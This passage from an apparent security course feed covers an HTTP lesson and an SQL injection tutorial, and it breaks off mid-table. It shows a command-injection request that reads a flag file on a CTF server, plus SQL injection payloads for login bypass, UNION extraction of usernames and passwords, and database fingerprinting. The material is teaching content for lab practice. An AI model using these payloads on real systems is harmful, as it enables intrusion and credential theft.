&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span> &lt;span style="color:#c4a000">action&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/ping&amp;#34;&lt;/span> &lt;span style="color:#c4a000">method&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IP: &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;text&amp;#34;&lt;/span> &lt;span style="color:#c4a000">name&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">br&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#c4a000">value&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Submit&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">html&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The IP is retrieved from the user via this &lt;code>form&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span> &lt;span style="color:#c4a000">action&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;/ping&amp;#34;&lt;/span> &lt;span style="color:#c4a000">method&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IP: &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;text&amp;#34;&lt;/span> &lt;span style="color:#c4a000">name&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;ip&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">br&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#204a87;font-weight:bold">input&lt;/span> &lt;span style="color:#c4a000">type&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#c4a000">value&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;Submit&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">&amp;lt;/&lt;/span>&lt;span style="color:#204a87;font-weight:bold">form&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From here we get the following information:&lt;/p>
&lt;ul>
&lt;li>upon pressing &amp;ldquo;Submit&amp;rdquo;, a &lt;code>GET&lt;/code> request is sent to &lt;code>/ping&lt;/code>&lt;/li>
&lt;li>the input we provide is set as the value of the key &lt;code>ip&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>So a request URL that gets the flag would look like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /ping?ip=; cat /home/ctf/flag
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try to do this with &lt;code>curl&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v -G -d &amp;#39;ip=; cat /home/ctf/flag&amp;#39; http://141.85.224.70:8069/ping
* Trying 141.85.224.70:8069...
* TCP_NODELAY set
* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)
&amp;gt; GET /ping?ip=; cat /home/ctf/flag HTTP/1.1
&amp;gt; Host: 141.85.224.70:8069
&amp;gt; User-Agent: curl/7.68.0
&amp;gt; Accept: */*
&amp;gt;
* Mark bundle as not supporting multiuse
&amp;lt; HTTP/1.1 400 Bad Request
[...]
&lt;/code>&lt;/pre>&lt;p>Why does the request fail?
Look at the request:&lt;/p>
&lt;pre tabindex="0">&lt;code>GET /ping?ip=; cat /home/ctf/flag HTTP/1.1
&lt;/code>&lt;/pre>&lt;p>The value of the query parameter &lt;code>ip&lt;/code> contains some forbidden characters: &lt;code>;&lt;/code>, &lt;code>/&lt;/code> and space.
We need to send them encoded for URLs.
For this we use the &lt;code>--data-urlencode&lt;/code> parameter for &lt;code>curl&lt;/code>:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# curl -v -G --data-urlencode &amp;#39;ip=; cat /home/ctf/flag&amp;#39; http://141.85.224.70:8069/ping
* Trying 141.85.224.70:8069...
* TCP_NODELAY set
* Connected to 141.85.224.70 (141.85.224.70) port 8069 (#0)
&amp;gt; GET /ping?ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag HTTP/1.1
&amp;gt; Host: 141.85.224.70:8069
&amp;gt; User-Agent: curl/7.68.0
&amp;gt; Accept: */*
&amp;gt;
* Mark bundle as not supporting multiuse
&amp;lt; HTTP/1.1 200 OK
[...]
&lt;/code>&lt;/pre>&lt;p>Notice that now the the value of &lt;code>ip&lt;/code> looks stranger: &lt;code>ip=%3B%20cat%20%2Fhome%2Fctf%2Fflag&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>%3B&lt;/code> is the URL encoding for &lt;code>;&lt;/code>&lt;/li>
&lt;li>&lt;code>%20&lt;/code> is the URL encoding for space&lt;/li>
&lt;li>&lt;code>%2F&lt;/code> is the URL encoding for &lt;code>/&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="wget">&lt;code>wget&lt;/code>&lt;/h3>
&lt;p>&lt;strong>Do not confuse it with &lt;code>curl&lt;/code>!&lt;/strong>
Its &lt;a href="https://linux.die.net/man/1/wget">man page&lt;/a> clearly states:&lt;/p>
&lt;blockquote>
&lt;p>Wget - The non-interactive network downloader.&lt;/p>
&lt;/blockquote>
&lt;p>In other words, while &lt;code>curl&lt;/code> is an HTTP client which, obviously, receives HTTP responses, &lt;code>wget&lt;/code> is used for &lt;strong>downloading files&lt;/strong> and nothing else.&lt;/p>
&lt;p>Let&amp;rsquo;s try it out:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# wget example.com
[...]
index.html 100%[===================&amp;gt;] 1,23K --.-KB/s in 0s
root@kali:~# cat index.html # Now we have the file locally.
&amp;lt;!doctype html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;Example Domain&amp;lt;/title&amp;gt;
[...]
&lt;/code>&lt;/pre>&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>HTTP is the most widely used protocol for passing data on the Internet.
It is a stateless protocol, meaning that each request is independent from any other request, even for the same resource.
It allows a few specific methods:
- &lt;code>GET&lt;/code> - request data from the server
- &lt;code>POST&lt;/code> - upload data to the server
- &lt;code>PUT&lt;/code> - update data on the server
- &lt;code>DELETE&lt;/code> - remove data from the server&lt;/p>
&lt;p>Each request is like a function call across the web and can receive parameters.
In a URL, they are separated from the path by &lt;code>?&lt;/code> and from each other by &lt;code>&amp;amp;&lt;/code>.
They are key-value pairs such as &lt;code>?user=hacker&amp;amp;role=god&lt;/code>.&lt;/p>
&lt;p>The two commands we&amp;rsquo;ve added to our arsenal today are &lt;code>curl&lt;/code> and &lt;code>wget&lt;/code>:&lt;/p>
&lt;ul>
&lt;li>&lt;code>curl&lt;/code>: create and send HTTP requests.
Here are some of its most useful parameters:
&lt;ul>
&lt;li>&lt;code>-v&lt;/code>: &lt;strong>verbose&lt;/strong> - display the request and response headers.&lt;/li>
&lt;li>&lt;code>-d&lt;/code>: &lt;strong>data&lt;/strong> - specify the body of a request (usually a &lt;code>POST&lt;/code> request) and the query parameters
&lt;ul>
&lt;li>&lt;code>-G&lt;/code>: &lt;strong>get&lt;/strong> - allows sending a body in a &lt;code>GET&lt;/code> request&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>-X &amp;lt;method&amp;gt;&lt;/code>: use another HTTP method than the default &lt;code>GET&lt;/code>&lt;/li>
&lt;li>&lt;code>-L&lt;/code>: &lt;strong>follow redirects&lt;/strong> - issue another request to the redirected URL the when receiving a &lt;code>3XX&lt;/code> response.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>wget&lt;/code>: download files&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;h2 id="challenge-give-to-post">Challenge: Give to Post&lt;/h2>
&lt;p>Read the message displayed by the server carefully.
It tells you all you need to get the flag.&lt;/p>
&lt;h2 id="challenge-king-kong">Challenge: King Kong&lt;/h2>
&lt;p>You need to tell the server that you are someone special.&lt;/p>
&lt;h2 id="challenge-name">Challenge: Name&lt;/h2>
&lt;p>Do what the server tells you.&lt;/p>
&lt;h2 id="challenge-gimme">Challenge: Gimme&lt;/h2>
&lt;p>Try to add a new resource to the server.
What can that 35 mean?&lt;/p>
&lt;h2 id="challenge-surprise">Challenge: Surprise&lt;/h2>
&lt;p>The server expects a specific type of &lt;strong>content&lt;/strong>.&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;h3 id="access-control-types">Access Control Types&lt;/h3>
&lt;p>Access control is one part of authorisation.
Below are the 3 main access control types, each with a brief description.
For a more in-depth look at these 3, check out &lt;a href="https://www.twingate.com/blog/access-control-models/">this link&lt;/a>.
They are not necessarily disjoint. Most applications and operating systems use all 3 types at once for different things.&lt;/p>
&lt;h4 id="discretionary-access-control-dac">Discretionary Access Control (DAC)&lt;/h4>
&lt;p>This is the type of model employed by Linux file permissions.
Each user can decide what permissions to give to other users.
It&amp;rsquo;s easy to implement, but can lead to vulnerabilities because it relies on the fact that users are knowledgeable about security, which is often a far-fetched assumption.&lt;/p>
&lt;h4 id="mandatory-access-control-mac">Mandatory Access Control (MAC)&lt;/h4>
&lt;p>While DAC is distributed (every user is free to do as they please with their resources), MAC is the opposite: it involves a third party called &lt;strong>resource monitor&lt;/strong> (eg: the OS) that decides who can do what.&lt;/p>
&lt;p>This is the case with sandboxing of iOS/Android apps.
The OS verifies each attempt to access a resource and decides whether to allow it or not.
This model is more complex as it requires a very secure resource monitor, but ensures better security than DAC as it makes fewer assumptions.&lt;/p>
&lt;h4 id="role-based-access-control-rbac">Role-Based Access Control (RBAC)&lt;/h4>
&lt;p>In this role, the subjects (users) may assume different roles and are granted privileges according to their roles rather than according to their user IDs.&lt;/p>
&lt;p>Imagine a student logging onto his school&amp;rsquo;s/university&amp;rsquo;s website.
If they log as a student, they can&amp;rsquo;t access teachers&amp;rsquo; exam solutions.
But if they could somehow obtain the role of teacher (while using the same account as before), they could view those solutions.&lt;/p>
&lt;p>&lt;img src="./assets/rbac.svg" alt="RBAC">&lt;/p>
&lt;p>This sort of attack is called a &lt;strong>privilege escalation attack&lt;/strong> because the student has managed to &lt;em>elevate&lt;/em> his default privileges (as a student) to those of a teacher.&lt;/p></description></item><item><title>Web:</title><link>/web/sql-injection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/sql-injection/</guid><description>
&lt;h1 id="sql-injection">SQL Injection&lt;/h1>
&lt;p>In this session, we&amp;rsquo;ll explain what SQL injection is, describe some common examples, explain how to find and exploit various kinds of SQL injection vulnerabilities, and summarize how to prevent SQL injection.&lt;/p>
&lt;p>&lt;strong>NOTE:&lt;/strong>&lt;/p>
&lt;p>For this session you&amp;rsquo;ll need to use &lt;a href="https://portswigger.net/burp">Burp Suite&lt;/a> so please follow the links in the &lt;a href="#further-reading">Further Reading&lt;/a> section to set it up if you haven&amp;rsquo;t done so yet.[&lt;a href="https://portswigger.net/support/configuring-your-browser-to-work-with-burp">2&lt;/a>,&lt;a href="https://portswigger.net/support/checking-your-browser-proxy-configuration">3&lt;/a>,&lt;a href="https://portswigger.net/support/installing-burp-suites-ca-certificate-in-your-browser">4&lt;/a>]&lt;/p>
&lt;h2 id="what-is-sql-injection">What is SQL injection&lt;/h2>
&lt;p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
It generally allows attackers to view data that they are not normally able to retrieve.
This might include data belonging to other users, or any other data that the application itself is able to access.
In many cases, an attacker can modify or delete this data, causing persistent changes to the application&amp;rsquo;s content or behavior.&lt;/p>
&lt;p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure or perform a denial-of-service attack.&lt;/p>
&lt;h3 id="what-is-the-impact-of-a-successful-sql-injection-attack">What is the impact of a successful SQL injection attack?&lt;/h3>
&lt;p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information.
Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines.
In some cases, an attacker can obtain a persistent backdoor into an organization&amp;rsquo;s systems, leading to a long-term compromise that can go unnoticed for an extended period.&lt;/p>
&lt;h3 id="sql-injection-examples">SQL injection examples&lt;/h3>
&lt;p>There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations.
Some common SQL injection examples include:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>&lt;a href="##retrieving-hidden-data">Retrieving hidden data&lt;/a>&lt;/strong> - you can modify an SQL query to return additional results.&lt;/li>
&lt;li>&lt;strong>&lt;a href="##subverting-application-logic">Subverting application logic&lt;/a>&lt;/strong> - you can change a query to interfere with the application&amp;rsquo;s logic.&lt;/li>
&lt;li>&lt;strong>&lt;a href="##SQL-injection-UNION-attacks">UNION attacks&lt;/a>&lt;/strong> - you can retrieve data from different database tables.&lt;/li>
&lt;li>&lt;strong>&lt;a href="##Examining-the-database">Examining the database&lt;/a>&lt;/strong> - you can extract information about the version and structure of the database.&lt;/li>
&lt;li>&lt;strong>&lt;a href="##Blind-SQL-injection">Blind SQL injection&lt;/a>&lt;/strong> - the results of a query you control are not returned in the application&amp;rsquo;s responses.&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="retrieving-hidden-data">Retrieving hidden data&lt;/h2>
&lt;p>Consider a shopping application that displays products in different categories.
When the user clicks on the Gifts category, their browser requests the URL:&lt;/p>
&lt;p>&lt;code>https://insecure-website.com/products?category=Gifts&lt;/code>&lt;/p>
&lt;p>This causes the application to make an SQL query to retrieve details of the relevant products from the database:&lt;/p>
&lt;p>&lt;code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1&lt;/code>&lt;/p>
&lt;p>This SQL query asks the database to return:&lt;/p>
&lt;ul>
&lt;li>all details (*)&lt;/li>
&lt;li>from the products table&lt;/li>
&lt;li>where the category is Gifts&lt;/li>
&lt;li>and released is 1.&lt;/li>
&lt;/ul>
&lt;p>The restriction &lt;code>released = 1&lt;/code> is being used to hide products that are not released.
For unreleased products, presumably &lt;code>released = 0&lt;/code>.&lt;/p>
&lt;p>The application doesn&amp;rsquo;t implement any defenses against SQL injection attacks, so an attacker can construct an attack like:&lt;/p>
&lt;p>&lt;code>https://insecure-website.com/products?category=Gifts'--&lt;/code>&lt;/p>
&lt;p>This results in the SQL query:&lt;/p>
&lt;p>&lt;code>SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1&lt;/code>&lt;/p>
&lt;p>The key thing here is that the double-dash sequence &lt;code>--&lt;/code> is a comment indicator in SQL, and means that the rest of the query is interpreted as a comment.
This effectively removes the remainder of the query, so it no longer includes &lt;code>AND released = 1&lt;/code>.
This means that all products are displayed, including unreleased products.&lt;/p>
&lt;p>Going further, an attacker can cause the application to display all the products in any category, including categories that they don&amp;rsquo;t know about:&lt;/p>
&lt;p>&lt;code>https://insecure-website.com/products?category=Gifts'+OR+1=1--&lt;/code>&lt;/p>
&lt;p>This results in the SQL query:&lt;/p>
&lt;p>&lt;code>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1&lt;/code>&lt;/p>
&lt;p>The modified query will return all items where either the category is Gifts, or 1 is equal to 1.
Since 1=1 is always true, the query will return all items.&lt;/p>
&lt;h2 id="subverting-application-logic">Subverting application logic&lt;/h2>
&lt;p>Consider an application that lets users log in with a username and password.
If a user submits the username &lt;code>wiener&lt;/code> and the password &lt;code>bluecheese&lt;/code>, the application checks the credentials by performing the following SQL query:&lt;/p>
&lt;p>&lt;code>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'&lt;/code>&lt;/p>
&lt;p>If the query returns the details of a user, then the login is successful.
Otherwise, it is rejected.&lt;/p>
&lt;p>Here, an attacker can log in as any user without a password simply by using the SQL comment sequence &lt;code>--&lt;/code> to remove the password check from the &lt;code>WHERE&lt;/code> clause of the query.
For example, submitting the username &lt;code>administrator'--&lt;/code> and a blank password results in the following query:&lt;/p>
&lt;p>&lt;code>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''&lt;/code>&lt;/p>
&lt;p>This query returns the user whose username is &lt;code>administrator&lt;/code> and successfully logs the attacker in as that user.&lt;/p>
&lt;h2 id="retrieving-data-from-other-database-tables">Retrieving data from other database tables&lt;/h2>
&lt;p>In cases where the results of an SQL query are returned within the application&amp;rsquo;s responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database.
This is done using the &lt;code>UNION&lt;/code> keyword, which lets you execute an additional &lt;code>SELECT&lt;/code> query and append the results to the original query.&lt;/p>
&lt;p>For example, if an application executes the following query containing the user input &amp;ldquo;Gifts&amp;rdquo;:&lt;/p>
&lt;p>&lt;code>SELECT name, description FROM products WHERE category = 'Gifts'&lt;/code>&lt;/p>
&lt;p>then an attacker can submit the input:&lt;/p>
&lt;p>&lt;code>' UNION SELECT username, password FROM users--&lt;/code>&lt;/p>
&lt;p>This will cause the application to return all usernames and passwords along with the names and descriptions of products.&lt;/p>
&lt;h2 id="sql-injection-union-attacks">SQL injection UNION attacks&lt;/h2>
&lt;p>When an application is vulnerable to SQL injection and the results of the query are returned within the application&amp;rsquo;s responses, the &lt;code>UNION&lt;/code> keyword can be used to retrieve data from other tables within the database.
This results in an SQL injection UNION attack.&lt;/p>
&lt;p>The &lt;code>UNION&lt;/code> keyword lets you execute one or more additional &lt;code>SELECT&lt;/code> queries and append the results to the original query.
For example:&lt;/p>
&lt;p>&lt;code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2&lt;/code>&lt;/p>
&lt;p>This SQL query will return a single result set with two columns, containing values from columns &lt;code>a&lt;/code> and &lt;code>b&lt;/code> in &lt;code>table1&lt;/code> and columns &lt;code>c&lt;/code> and &lt;code>d&lt;/code> in &lt;code>table2&lt;/code>.&lt;/p>
&lt;p>For a &lt;code>UNION&lt;/code> query to work, two key requirements must be met:&lt;/p>
&lt;ul>
&lt;li>The individual queries must return the same number of columns.&lt;/li>
&lt;li>The data types in each column must be compatible between the individual queries.&lt;/li>
&lt;/ul>
&lt;p>To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements.
This generally involves figuring out:&lt;/p>
&lt;ul>
&lt;li>How many columns are being returned from the original query?&lt;/li>
&lt;li>Which columns returned from the original query are of a suitable data type to hold the results from the injected query?&lt;/li>
&lt;/ul>
&lt;h3 id="determining-the-number-of-columns-required-in-an-sql-injection-union-attack">Determining the number of columns required in an SQL injection UNION attack&lt;/h3>
&lt;p>When performing an SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.&lt;/p>
&lt;p>The first method involves injecting a series of &lt;code>ORDER BY&lt;/code> clauses and incrementing the specified column index until an error occurs.
For example, assuming the injection point is a quoted string within the &lt;code>WHERE&lt;/code> clause of the original query, you would submit:&lt;/p>
&lt;ul>
&lt;li>&lt;code>' ORDER BY 1--&lt;/code>&lt;/li>
&lt;li>&lt;code>' ORDER BY 2--&lt;/code>&lt;/li>
&lt;li>&lt;code>' ORDER BY 3--&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>etc.&lt;/p>
&lt;p>This series of payloads modifies the original query to order the results by different columns in the result set.
The column in an &lt;code>ORDER BY&lt;/code> clause can be specified by its index, so you don&amp;rsquo;t need to know the names of any columns.
When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:&lt;/p>
&lt;p>&lt;code>The ORDER BY position number 3 is out of range of the number of items in the select list.&lt;/code>&lt;/p>
&lt;p>The application might actually return the database error in its HTTP response, or it might return a generic error, or simply return no results.
Provided you can detect some difference in the application&amp;rsquo;s response, you can infer how many columns are being returned from the query.&lt;/p>
&lt;p>The second method involves submitting a series of &lt;code>UNION SELECT&lt;/code> payloads specifying a different number of null values:&lt;/p>
&lt;ul>
&lt;li>&lt;code>' UNION SELECT NULL--&lt;/code>&lt;/li>
&lt;li>&lt;code>' UNION SELECT NULL,NULL--&lt;/code>&lt;/li>
&lt;li>&lt;code>' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>etc.&lt;/p>
&lt;p>If the number of nulls does not match the number of columns, the database returns an error, such as:&lt;/p>
&lt;p>&lt;code>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.&lt;/code>&lt;/p>
&lt;p>Again, the application might actually return this error message, or might just return a generic error or no results.
When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column.
The effect on the resulting HTTP response depends on the application&amp;rsquo;s code.
If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table.
Otherwise, the null values might trigger a different error, such as a &lt;code>NullPointerException&lt;/code>.
Worst case, the response might be indistinguishable from that which is caused by an incorrect number of nulls, making this method of determining the column count ineffective.&lt;/p>
&lt;p>&lt;strong>NOTE:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>The reason for using &lt;code>NULL&lt;/code> as the values returned from the injected &lt;code>SELECT&lt;/code> query is that the data types in each column must be compatible between the original and the injected queries.
Since &lt;code>NULL&lt;/code> is convertible to every commonly used data type, using &lt;code>NULL&lt;/code> maximizes the chance that the payload will succeed when the column count is correct.&lt;/li>
&lt;li>In Oracle, every &lt;code>SELECT&lt;/code> query must use the FROM keyword and specify a valid table.
There is a built-in table in Oracle called &lt;code>DUAL&lt;/code> which can be used for this purpose.
So the injected queries in Oracle would need to look like: &lt;code>' UNION SELECT NULL FROM DUAL--&lt;/code>.&lt;/li>
&lt;li>The payloads described use the double-dash comment sequence &lt;code>--&lt;/code> to comment out the remainder of the original query following the injection point.
In MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character &lt;code>#&lt;/code> can be used to identify a comment.&lt;/li>
&lt;/ul>
&lt;p>For more details of database-specific syntax, see the &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>.&lt;/p>
&lt;h3 id="finding-columns-with-a-useful-data-type-in-an-sql-injection-union-attack">Finding columns with a useful data type in an SQL injection UNION attack&lt;/h3>
&lt;p>The reason for performing an SQL injection UNION attack is to be able to retrieve the results from an injected query.
Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.&lt;/p>
&lt;p>Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of &lt;code>UNION SELECT&lt;/code> payloads that place a string value into each column in turn.
For example, if the query returns four columns, you would submit:&lt;/p>
&lt;ul>
&lt;li>&lt;code>' UNION SELECT 'a',NULL,NULL,NULL--&lt;/code>&lt;/li>
&lt;li>&lt;code>' UNION SELECT NULL,'a',NULL,NULL--&lt;/code>&lt;/li>
&lt;li>&lt;code>' UNION SELECT NULL,NULL,'a',NULL--&lt;/code>&lt;/li>
&lt;li>&lt;code>' UNION SELECT NULL,NULL,NULL,'a'--&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:&lt;/p>
&lt;p>&lt;code>Conversion failed when converting the varchar value 'a' to data type int.&lt;/code>&lt;/p>
&lt;p>If an error does not occur, and the application&amp;rsquo;s response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.&lt;/p>
&lt;h3 id="using-an-sql-injection-union-attack-to-retrieve-interesting-data">Using an SQL injection UNION attack to retrieve interesting data&lt;/h3>
&lt;p>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.&lt;/p>
&lt;p>Suppose that:&lt;/p>
&lt;ul>
&lt;li>The original query returns two columns, both of which can hold string data.&lt;/li>
&lt;li>The injection point is a quoted string within the &lt;code>WHERE&lt;/code> clause.&lt;/li>
&lt;li>The database contains a table called &lt;code>users&lt;/code> with the columns &lt;code>username&lt;/code> and &lt;code>password&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>In this situation, you can retrieve the contents of the &lt;code>users&lt;/code> table by submitting the input:&lt;/p>
&lt;p>&lt;code>' UNION SELECT username, password FROM users--&lt;/code>&lt;/p>
&lt;p>Of course, the crucial information needed to perform this attack is that there is a table called &lt;code>users&lt;/code> with two columns called &lt;code>username&lt;/code> and &lt;code>password&lt;/code>.
Without this information, you would be left trying to guess the names of tables and columns.
In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.&lt;/p>
&lt;h3 id="retrieving-multiple-values-within-a-single-column">Retrieving multiple values within a single column&lt;/h3>
&lt;p>In the preceding example, suppose instead that the query only returns a single column.&lt;/p>
&lt;p>You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values.
For example, in Oracle you could submit the input:&lt;/p>
&lt;p>&lt;code>' UNION SELECT username || '~' || password FROM users--&lt;/code>&lt;/p>
&lt;p>This uses the double-pipe sequence &lt;code>||&lt;/code> which is a string concatenation operator in Oracle.
The injected query concatenates together the values of the &lt;code>username&lt;/code> and &lt;code>password&lt;/code> fields, separated by the &lt;code>~&lt;/code> character.&lt;/p>
&lt;p>The results from the query will let you read all of the usernames and passwords, for example:&lt;/p>
&lt;pre tabindex="0">&lt;code>...
administrator~s3cure
wiener~peter
carlos~montoya
...
&lt;/code>&lt;/pre>&lt;p>Note that different databases use different syntax to perform string concatenation.
For more details, see the &lt;a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet&lt;/a>.&lt;/p>
&lt;h2 id="examining-the-database">Examining the database&lt;/h2>
&lt;p>Following the initial identification of an SQL injection vulnerability, it is generally useful to obtain some information about the database itself.
This information can often pave the way for further exploitation.&lt;/p>
&lt;p>You can query the version details for the database.
The way that this is done depends on the database type, so you can infer the database type from whichever technique works.
For example, in Oracle you can execute:&lt;/p>
&lt;p>&lt;code>SELECT * FROM v$version&lt;/code>&lt;/p>
&lt;p>You can also determine what database tables exist, and which columns they contain.
For example, on most databases you can execute the following query to list the tables:&lt;/p>
&lt;p>&lt;code>SELECT * FROM information_schema.tables&lt;/code>&lt;/p>
&lt;h3 id="querying-the-database-type-and-version">Querying the database type and version&lt;/h3>
&lt;p>Different databases provide different ways of querying their version.
You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.&lt;/p>
&lt;p>The queries to determine the database version for some popular database types are as follows:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Database type&lt;/th>
&lt;th>Query&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Microsoft, MySQL&lt;/td>
&lt;td>&lt;code>SELECT @@version&lt;/code>&lt;/td>
&lt;/tr>
&lt;tr>
